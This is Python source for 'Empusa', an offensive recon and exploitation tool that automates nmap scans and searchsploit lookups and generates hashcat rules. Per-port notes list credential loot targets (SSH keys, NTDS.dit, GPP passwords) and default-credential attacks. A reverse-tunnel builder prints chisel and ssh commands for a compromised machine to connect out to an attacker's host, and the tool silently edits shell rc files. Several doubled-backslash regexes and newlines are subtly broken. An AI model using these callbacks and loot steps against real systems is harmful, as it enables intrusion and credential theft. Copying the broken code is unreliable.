import os
import subprocess
import argparse
import re
from rich.console import Console
from rich.prompt import Prompt
from rich.text import Text
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from collections import Counter
from datetime import datetime

console = Console()

def print_banner():
    banner = r"""
[bold red]
              ▄████████████▄
          ▄███▀▀        ▀▀███▄
        ▄██▀    ▄▄▄▄▄▄     ▀██▄
       ██▀    ▄█▀    ▀█▄     ▀██
      ██     ▄█        █▄     ██
     ██     ███  ▄▄▄▄  ███     ██
     ██     ███ ██████ ███     ██   [dim]“She shifts form... beauty, beast, and death.”[/dim]
     ██     ███  ▀▀▀▀  ███     ██
     ██     ▀█▄        ▄█▀     ██   [italic red]Empusa — Devourer of Men, Feeder on Fear[/italic red]
      ██▄     ▀█▄▄▄▄▄▄█▀     ▄██
       ▀██▄     ▀▀▀▀▀▀     ▄██▀
         ▀███▄▄        ▄▄▄██▀
             ▀▀████████▀▀
[/bold red]
[bold magenta]
███████╗   ███╗   ███╗   ██████╗   ██╗   ██╗   ███████╗    █████╗ 
██╔════╝   ████╗ ████║   ██╔══██╗  ██║   ██║   ██╔════╝   ██╔══██╗
█████╗     ██╔████╔██║   ██████╔╝  ██║   ██║   ███████╗   ███████║
██╔══╝     ██║╚██╔╝██║   ██╔═══╝   ██║   ██║   ╚════██║   ██╔══██║
███████╗   ██║ ╚═╝ ██║   ██║       ╚██████╔╝   ███████║   ██║  ██║
╚══════╝   ╚═╝     ╚═╝   ╚═╝        ╚═════╝    ╚══════╝   ╚═╝  ╚═╝
[/bold magenta]
[bold cyan]  Shape-shifting Recon & Exploitation Framework[/bold cyan]
[green]  Inspired by Empusa — vampire, demon, and sorceress of stealth[/green]
[yellow]  https://github.com/Icarus4122/empusa  |  v1.0.0[/yellow]
"""
    console.print(Panel.fit(banner, border_style="red"))

def detect_os(nmap_output):
    with open(nmap_output, 'r', errors='ignore') as f:
        content = f.read().lower()
        if "microsoft" in content:
            return "Windows"
        elif any(x in content for x in ["linux", "unix", "ubuntu", "debian", "apache"]):
            return "Linux"
        else:
            return "Unknown"

def search_exploits_from_nmap(nmap_file):
    if not os.path.exists(nmap_file):
        console.print(f"[red]Nmap file not found: {nmap_file}[/red]")
        return
    console.print(f"[cyan][*] Parsing services from {nmap_file} and searching exploits...[/cyan]")
    with open(nmap_file, 'r', errors='ignore') as f:
        lines = f.readlines()
    found_terms = set()
    for line in lines:
        match = re.search(r'(\\d+)/(tcp|udp)\\s+open\\s+([\\w\\-]+)(\\s+([\\w\\-\\.]+))?', line)
        if match:
            service = match.group(3)
            version = match.group(5) if match.group(5) else ""
            query = f"{service} {version}".strip()
            found_terms.add(query)

    exploit_log = os.path.join(os.path.dirname(nmap_file), "searchsploit_results.md")
    with open(exploit_log, "w") as out:
        for term in sorted(found_terms):
            console.print(f"\\n[bold yellow]>> searchsploit {term}[/bold yellow]")
            out.write(f"## Exploits for: {term}\\n")
            try:
                result = subprocess.run(["searchsploit", term], capture_output=True, text=True, check=False)
                console.print(result.stdout)
                out.write(f"```\\n{result.stdout}\\n```\\n\\n")
            except FileNotFoundError:
                console.print("[red]searchsploit not found on PATH.[/red]")
                out.write("searchsploit not available on this system.\\n\\n")

    console.print(f"[green][+] Saved exploit suggestions to:[/] {exploit_log}")

def run_nmap(ip, output_path):

    os.makedirs(output_path, exist_ok=True)
    output_file = os.path.join(output_path, "full_scan.txt")
    greppable = os.path.join(output_path, "ports_grep.txt")

    def _run(cmd):
        return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _parse_greppable(path):
        ports = set()
        rx = re.compile(r'(\d+)/open/(?:tcp|udp)', re.IGNORECASE)
        try:
            with open(path, "r", errors="ignore") as f:
                for line in f:
                    if "Ports:" not in line:
                        continue
                    for m in rx.finditer(line):
                        ports.add(m.group(1))
        except FileNotFoundError:
            pass
        return sorted(ports, key=int)

    console.print(f"[*] Scanning (fast discovery) on [bold yellow]{ip}[/]...", style="cyan")

    disc_cmd = [
        "nmap", "-n", "-T4", "-Pn", "-p-",
        "--max-retries", "2",
        "--host-timeout", "15m",
        "-sS",
        ip, "-oG", greppable
    ]
    _run(disc_cmd)
    open_ports = _parse_greppable(greppable)

    if not open_ports:
        console.print("[yellow]No ports found, retrying discovery with higher retries…[/yellow]")
        disc_cmd_retry = [
            "nmap", "-n", "-T4", "-Pn", "-p-",
            "--max-retries", "4",
            "--max-rtt-timeout", "1000ms",
            "-sS",
            ip, "-oG", greppable
        ]
        _run(disc_cmd_retry)
        open_ports = _parse_greppable(greppable)

    if not open_ports:
        console.print("[red]Discovery still empty. Falling back to -A (full) so you get results.[/red]")
        _run(["nmap", "-A", "-T4", "-Pn", "-p-", ip, "-oN", output_file])
    else:
        ports_csv = ",".join(open_ports)
        console.print(f"[*] Enriching {ip} (ports: {ports_csv})...", style="cyan")
        enrich_cmd = [
            "nmap", "-n", "-T4", "-Pn",
            "-sV", "--version-light",
            "--script-timeout", "5s",
            "-p", ports_csv,
            ip, "-oN", output_file
        ]
        _run(enrich_cmd)

    ports_dir = os.path.join(output_path, "ports")
    os.makedirs(ports_dir, exist_ok=True)
    environment = os.path.basename(os.path.dirname(os.path.dirname(output_path)))

    nmap_line = re.compile(r'(\d+)/(tcp|udp)\s+open\s+([\w\-\._]+)(\s+(.*))?')
    with open(output_file, 'r', errors='ignore') as f:
        lines = f.readlines()
    for line in lines:
        match = nmap_line.search(line)
        if not match:
            continue
        port = match.group(1)
        proto = match.group(2)
        service = match.group(3).lower()
        version_info = match.group(5) if match.group(5) else ""

        filename = f"{port}-{service}.txt"
        port_file_path = os.path.join(ports_dir, filename)

        with open(port_file_path, 'w') as pf:
            pf.write(f"# Environment: {environment}\n")
            pf.write(f"# Host: {ip}\n")
            pf.write(f"# Port: {port}/{proto}\n")
            pf.write(f"# Service: {service}\n")
            if version_info:
                pf.write(f"# Version: {version_info}\n")
            pf.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")
            pf.write(line.strip() + "\n")
            pf.write("\n# === Suggested Next Steps ===\n")
            if service in ["http", "https"]:
                pf.write("# - Run dirsearch or gobuster for content discovery\n")
                pf.write("# - Scan with Nikto, Nuclei, or Wapiti for vulnerabilities\n")
                pf.write("# - Loot: robots.txt, config files, login panels, backups\n")
                pf.write("# - Try default creds or admin/admin on CMS\n")
            elif service == "ssh":
                pf.write("# - Check for weak/default SSH credentials\n")
                pf.write("# - Loot: ~/.ssh/id_rsa, authorized_keys, bash_history\n")
                pf.write("# - Post-exploitation: SSH pivot or key reuse\n")
            elif service in ["smb", "microsoft-ds"]:
                pf.write("# - Enum with smbmap, enum4linux-ng, CrackMapExec\n")
                pf.write("# - Loot: shares, SAM/NTDS.dit, SYSVOL, GPP passwords\n")
                pf.write("# - Check for null sessions and guest access\n")
            elif service == "ftp":
                pf.write("# - Check for anonymous login\n")
                pf.write("# - Loot: upload directories, backup archives, creds.txt\n")
                pf.write("# - Post-exploitation: file upload for persistence\n")
            elif service == "rdp":
                pf.write("# - Confirm NLA status and CredSSP vulnerabilities\n")
                pf.write("# - Brute force with Hydra or Crowbar (if permitted)\n")
                pf.write("# - Loot: screenshots, clipboard access, session hijack\n")
            elif service == "mysql":
                pf.write("# - Attempt login with root/root or no password\n")
                pf.write("# - Loot: mysql.user table, sensitive schema dumps\n")
                pf.write("# - Post-exploitation: data exfil or local file read\n")
            elif service == "telnet":
                pf.write("# - WARNING: Telnet is plaintext and sniffable\n")
                pf.write("# - Try common creds: admin:admin, root:root\n")
                pf.write("# - Loot: configs, debug menus, motd banners\n")
            elif service == "winrm":
                pf.write("# - Test with evil-winrm or CrackMapExec\n")
                pf.write("# - Loot: PowerShell history, execution context\n")
                pf.write("# - Post-exploitation: PS credential injection\n")
            elif service == "ldap":
                pf.write("# - Use ldapsearch or nmap --script=ldap* for info leak\n")
                pf.write("# - Loot: usernames, OU structure, domain policies\n")
                pf.write("# - Check for anonymous binds or ASREPRoastable users\n")
            else:
                pf.write("# - Investigate service manually or with nmap scripts\n")
                pf.write("# - Loot: banners, misconfigurations, leaks\n")
            pf.write("# ============================\n")

    return ip, output_file

def summarize_hosts(env_name):
    base_dir = os.path.abspath(env_name)
    if not os.path.exists(base_dir):
        console.print(f"[bold red]Environment folder '{env_name}' does not exist.[/bold red]")
        return

    output_lines = []
    for entry in os.listdir(base_dir):
        full_path = os.path.join(base_dir, entry)
        if os.path.isdir(full_path) and "-" in entry:
            nmap_file = os.path.join(full_path, "nmap", "full_scan.txt")
            if os.path.exists(nmap_file):
                with open(nmap_file, 'r', errors='ignore') as f:
                    ports = []
                    for line in f:
                        if "/tcp" in line and "open" in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                ports.append(f"{parts[0]}/{parts[2]}")
                ports_display = ", ".join(ports) if ports else "No open ports"
                output_lines.append(f"{entry}: {ports_display}")

    if output_lines:
        console.print("[bold blue]== Host Summary ==[/bold blue]", highlight=False)
        console.print("```", highlight=False)
        for line in output_lines:
            console.print(line, highlight=False)
        console.print("```", highlight=False)
    else:
        console.print("[bold yellow]No scan results found to summarize.[/bold yellow]")

def set_shell_history_hooks(env_path):
    shell = os.environ.get("SHELL", "/bin/bash")
    hist_file = os.path.abspath(os.path.join(env_path, "commands_ran.txt"))
    rc_file = os.path.expanduser("~/.bashrc" if "bash" in shell else "~/.zshrc")

    if "bash" in shell:
        config = f"""
# Automation History Logging
export HISTFILE="{hist_file}"
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTTIMEFORMAT="%F %T "
shopt -s histappend
PROMPT_COMMAND="history -a; $PROMPT_COMMAND"
"""
    else:
        config = f"""
# Automation History Logging
export HISTFILE="{hist_file}"
export HISTSIZE=10000
export SAVEHIST=20000
export HISTTIMEFORMAT="%F %T "
setopt EXTENDED_HISTORY
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY
"""

    with open(rc_file, "a") as f:
        f.write(config)

    console.print(f"[green][+] Shell logging hook written to {rc_file}[/green]")
    console.print(f"[yellow]Please run [bold]source {rc_file}[/bold] to activate it.[/yellow]")

def build_env(env_name, ips):
    base_dir = os.path.abspath(env_name)
    os.makedirs(base_dir, exist_ok=True)

    users_file = os.path.join(base_dir, f"{env_name}-users.txt")
    passwords_file = os.path.join(base_dir, f"{env_name}-passwords.txt")
    commands_log_file = os.path.join(base_dir, "commands_ran.txt")

    open(users_file, 'w').close()
    open(passwords_file, 'w').close()
    open(commands_log_file, 'w').close()

    shell = os.environ.get("SHELL", "/bin/bash")
    rc_file = os.path.expanduser("~/.bashrc" if "bash" in shell else "~/.zshrc")

    if "bash" in shell:
        config = f"""
# Automation History Logging
export HISTFILE="{commands_log_file}"
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTTIMEFORMAT="%F %T "
shopt -s histappend
PROMPT_COMMAND="history -a; $PROMPT_COMMAND"
"""
    else:
        config = f"""
# Automation History Logging
export HISTFILE="{commands_log_file}"
export HISTSIZE=10000
export SAVEHIST=20000
export HISTTIMEFORMAT="%F %T "
setopt EXTENDED_HISTORY
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY
"""

    with open(rc_file, "a") as f:
        f.write(config)

    console.print(f"[green][+] Shell logging hook written to {rc_file}[/green]")
    console.print(f"[yellow]Please run [bold]source {rc_file}[/bold] to activate it.[/yellow]")

    ip_dirs = {}

    for ip in ips:
        temp_path = os.path.join(base_dir, ip)
        nmap_path = os.path.join(temp_path, "nmap")
        os.makedirs(nmap_path, exist_ok=True)
        ip_dirs[ip] = nmap_path

    console.print("[bold green]\\n[*] Starting threaded Nmap scanning...[/bold green]")
    scan_results = {}
    max_workers = min(8, len(ips))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {executor.submit(run_nmap, ip, nmap_path): ip for ip, nmap_path in ip_dirs.items()}
        for future in as_completed(future_to_ip):
            ip, scan_output = future.result()
            scan_results[ip] = scan_output

    for ip, scan_output in scan_results.items():
        os_type = detect_os(scan_output)
        old_path = os.path.join(base_dir, ip)
        new_path = os.path.join(base_dir, f"{ip}-{os_type}")

        if os.path.exists(new_path):
            console.print(f"[!] Warning: {new_path} already exists. Skipping rename.", style="bold red")
        else:
            os.rename(old_path, new_path)
            console.print(f"[+] {ip} classified as {os_type} -> {new_path}", style="green")

    with open(commands_log_file, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Built environment '{env_name}' with IPs: {', '.join(ips)}\\n")

def build_reverse_tunnel():
    console.print("\\n[bold cyan]== Reverse Tunnel Builder ==[/]")
    console.print("[bold]Choose Tunnel Type:[/]")
    console.print("1. Chisel")
    console.print("2. SSH")
    console.print("0. Back to Main Menu")

    choice = Prompt.ask("Select an option")

    if choice == '1':
        attacker_ip = Prompt.ask("Enter your public IP (Chisel server)")
        chisel_port = Prompt.ask("Enter port for Chisel listener on your machine")
        socks_port = Prompt.ask("Enter SOCKS proxy port to open (on your machine)")

        console.print(f"""
[bold green]--- Chisel Setup ---[/bold green]
[bold]On your attacking machine, run:[/bold]
  ./chisel server -p {chisel_port} --socks5 --reverse

[bold]On the target (compromised) machine, run:[/bold]
  ./chisel client {attacker_ip}:{chisel_port} R:{socks_port}:socks
""")

    elif choice == '2':
        attacker_user = Prompt.ask("Enter your username on attacker machine")
        attacker_host = Prompt.ask("Enter your public IP or hostname")
        remote_port = Prompt.ask("Enter remote port to open on attacker machine")
        local_port = Prompt.ask("Enter local port to expose (on target machine)")

        console.print(f"""
[bold green]--- SSH Tunnel Setup ---[/bold green]
[bold]On the target (compromised) machine, run:[/bold]
  ssh -R {remote_port}:127.0.0.1:{local_port} {attacker_user}@{attacker_host}
""")

    elif choice == '0':
        return
    else:
        console.print("[bold red]Invalid choice. Returning to main menu.[/bold red]")

def generate_hashcat_rules():
    console.print("[bold cyan]\\n== Hashcat Rule Generator ==[/bold cyan]")

    domain = Prompt.ask("Enter domain/environment name (used in filename)").strip().rstrip('/')
    search_pattern = f"\\\\{domain}-passwords.txt"
    console.print(f"[cyan]Looking for:[/] {search_pattern}")

    try:
        try:
            locate_output = subprocess.check_output(["locate", "-b", search_pattern]).decode().splitlines()
        except subprocess.CalledProcessError:
            console.print("[yellow]No match found. Updating database with 'sudo updatedb'...[/yellow]")
            subprocess.run(["sudo", "updatedb"])
            try:
                locate_output = subprocess.check_output(["locate", "-b", search_pattern]).decode().splitlines()
            except subprocess.CalledProcessError:
                console.print(f"[bold red]Still could not locate the file: {search_pattern}[/bold red]")
                domain = Prompt.ask("Re-enter domain name (or CTRL+C to cancel)").strip().rstrip('/')
                search_pattern = f"\\\\{domain}-passwords.txt"
                console.print(f"[cyan]Retrying with:[/] {search_pattern}")
                try:
                    locate_output = subprocess.check_output(["locate", "-b", search_pattern]).decode().splitlines()
                except subprocess.CalledProcessError:
                    console.print("[bold red]Failed again. Aborting.[/bold red]")
                    return
    except subprocess.CalledProcessError:
        console.print("[bold red]Could not run 'locate'. Try running 'sudo updatedb' first.[/bold red]")
        return

    matches = [line for line in locate_output if os.path.basename(line) == f"{domain}-passwords.txt"]

    if not matches:
        console.print(f"[bold red]No {domain}-passwords.txt file found using locate.[/bold red]")
        return

    if len(matches) == 1:
        pw_file = matches[0]
    else:
        console.print("[bold yellow]Multiple password files found:[/bold yellow]")
        for i, path in enumerate(matches):
            console.print(f"{i + 1}. {path}")
        index = int(Prompt.ask("Select the file to use", choices=[str(i + 1) for i in range(len(matches))])) - 1
        pw_file = matches[index]

    env = os.path.dirname(pw_file)
    rule_file = os.path.join(env, "hashcat_generated.rule")

    with open(pw_file, 'r', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    rule_counter = Counter()

    for pw in passwords:
        pw_rules = set()

        # Case patterns
        if pw.islower(): pw_rules.add("l")
        if pw.isupper(): pw_rules.add("u")
        if pw.istitle(): pw_rules.add("c")
        if re.search(r"[A-Z][a-z]+[A-Z]", pw): pw_rules.add("c")

        # Reverse detection
        if pw[::-1] in passwords: pw_rules.add("r")

        # Digit patterns
        if any(char.isdigit() for char in pw): pw_rules.add("$1")
        if pw[-1:].isdigit(): pw_rules.add("$" + pw[-1])
        if pw[-3:].isdigit(): pw_rules.add("$" + pw[-3:])
        if pw.istitle() and pw[-1:].isdigit(): pw_rules.add("c$1")

        # Symbol endings
        if pw[-1:] in "!@#$%^&*()": pw_rules.add("$" + pw[-1])

        # Year pattern detection (1900–2029)
        if re.search(r"(19|20)[0-9]{2}", pw): pw_rules.add("$2023")

        # Repeated characters
        if re.search(r"(.)\\1{2,}", pw): pw_rules.add("d")

        # Keyboard walk patterns
        if any(x in pw.lower() for x in ["qwe", "asd", "zxc", "123", "789"]): pw_rules.add("d")

        # Common leetspeak
        if "@" in pw or "4" in pw: pw_rules.add("sa@")
        if "3" in pw: pw_rules.add("se3")
        if "1" in pw or "!" in pw: pw_rules.add("sl1")
        if "0" in pw: pw_rules.add("so0")
        if "5" in pw: pw_rules.add("ss5")
        if "7" in pw: pw_rules.add("st7")

        # Prefix/suffix common admin words
        common_words = ["admin", "test", "guest", "temp", "root"]
        if any(pw.lower().startswith(w) for w in common_words): pw_rules.add("^A")
        if any(pw.lower().endswith(w) for w in common_words): pw_rules.add("$A")

        # Phone number / ZIP code detection
        if pw.isdigit() and len(pw) in (5, 10): pw_rules.add("$zip")

        if pw_rules:
            rule_combo = ''.join(sorted(pw_rules))
            rule_counter[rule_combo] += 1
    most_common_rules = [rule for rule, _ in rule_counter.most_common(10)]

    with open(rule_file, 'w') as rf:
        for rule in most_common_rules:
            rf.write(rule + "\\n")

    console.print(f"[green][+] {len(most_common_rules)} rules generated from {len(passwords)} passwords[/green]")
    console.print(f"[bold green]Saved rules to:[/] {rule_file}")


def summarize_command():
    console.print("[bold blue]==== Environment Automation Tool ====[/bold blue]")
    console.print("1. Build New Environment")
    console.print("2. Build Reverse Tunnel")
    console.print("3. Generate Hashcat Rules")
    console.print("4. Search Exploits from Nmap Results")
    console.print("0. Exit")

def main_menu():
    print_banner()
    while True:
        summarize_hosts(".")
        console.print("")
        summarize_command()
        choice = Prompt.ask("Select an option")

        if choice == '1':
            env_name = Prompt.ask("Enter environment name")
            ip_input = Prompt.ask("Enter IPs (comma-separated)")
            ips = [ip.strip() for ip in ip_input.split(',') if ip.strip()]
            build_env(env_name, ips)
        elif choice == '2':
            build_reverse_tunnel()
        elif choice == '3':
            generate_hashcat_rules()
        elif choice == '4':
            env_name = Prompt.ask("Enter environment name")
            ip_target = Prompt.ask("Enter target IP or folder format (e.g., 10.10.10.10-Windows)")
            nmap_path = os.path.join(env_name, ip_target, "nmap", "full_scan.txt")
            search_exploits_from_nmap(nmap_path)
        elif choice == '0':
            console.print("Exiting.", style="bold yellow")
            break
        else:
            console.print("[bold red]Invalid choice. Try again.[/bold red]")

def main():
    parser = argparse.ArgumentParser(prog="empusa", description="Empusa – Recon & Exploitation Automation")
    parser.add_argument("--menu", action="store_true", help="Launch interactive menu (default)")
    args = parser.parse_args()
    main_menu()

if __name__ == '__main__':
    main()